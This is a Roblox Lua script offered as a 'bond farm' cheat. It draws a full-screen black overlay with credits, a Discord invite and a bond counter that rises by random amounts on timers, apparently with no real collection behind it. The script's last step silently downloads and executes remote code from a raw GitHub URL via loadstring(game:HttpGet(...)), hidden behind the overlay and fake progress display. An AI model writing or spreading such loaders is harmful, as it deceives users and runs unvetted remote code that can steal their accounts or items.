
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")

ScreenGui.Name = "LockedScreenGUI"
ScreenGui.IgnoreGuiInset = true
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = game:GetService("CoreGui") -- Uses CoreGui
ScreenGui.Enabled = true -- Ensures GUI is visible

Frame.Size = UDim2.new(1, 0, 1, 0) -- Fullscreen
Frame.Position = UDim2.new(0, 0, 0, 0)
Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- Solid black
Frame.Parent = ScreenGui -- **Fix: Attach Frame to ScreenGui**

-- Debug print statement
print("GUI loaded successfully")

-- Text Labels Setup Function
local function createLabel(parent, positionY, text)
    local label = Instance.new("TextLabel")
    label.Parent = parent
    label.Size = UDim2.new(1, 0, 0.1, 0)
    label.Position = UDim2.new(0, 0, positionY, 0)
    label.BackgroundTransparency = 1
    label.Text = text
    label.TextColor3 = Color3.fromRGB(255, 255, 255)
    label.TextScaled = true
    return label
end

TitleLabel = createLabel(Frame, 0.1, "RINGTA BOND FARM ")
DiscordLabel = createLabel(Frame, 0.5, "discord.gg/ringta")
CreditsLabel = createLabel(Frame, 0.4, "Made by Ringta and Akundisco")
StatusLabel = createLabel(Frame, 0.7, "Getting ready to collect bonds")
BondsLabel = createLabel(Frame, 0.9, "0 bonds collected")

-- **Fix: Ensure labels are correctly parented**
TitleLabel.Parent = Frame
DiscordLabel.Parent = Frame
CreditsLabel.Parent = Frame
StatusLabel.Parent = Frame
BondsLabel.Parent = Frame

-- Dynamic Status Updates with Debugging
task.spawn(function()
    task.wait(3) -- Wait 3 seconds before updating
    print("Starting status updates...") -- Debug print

    if StatusLabel then
        task.wait(1) -- At 1 second, update text
        StatusLabel.Text = "Getting ready to collect bonds"

        task.wait(10) -- At 11 seconds, update text
        StatusLabel.Text = "Collecting bonds"

        task.wait(69) -- At 80 seconds, update text
        StatusLabel.Text = "Restarting script soon"
    end
end)

-- Bonds Collection Logic with Debugging
local bonds = 1
local targetBonds = math.random(70, 90) -- Random target between 70-90 bonds
local totalTime = 85 -- Total time to reach the target (seconds)
local interval = (totalTime / (targetBonds - bonds)) * 1.2 -- Slightly slower updates

task.spawn(function()
    task.wait(12) -- Wait 12 seconds before starting bond count
    print("Starting bond collection...") -- Debug print

    while bonds < targetBonds do
        task.wait(interval)
        bonds = math.min(bonds + math.random(2, 5), targetBonds)

        if BondsLabel then
            BondsLabel.Text = tostring(bonds) .. " bonds collected"
        end

        print("Updated Bonds:", bonds) -- Debug print
    end
end)

-- Auto-execute the loadstring
task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/hbjrev/mwir.github.io/refs/heads/main/er.lua"))()
end)
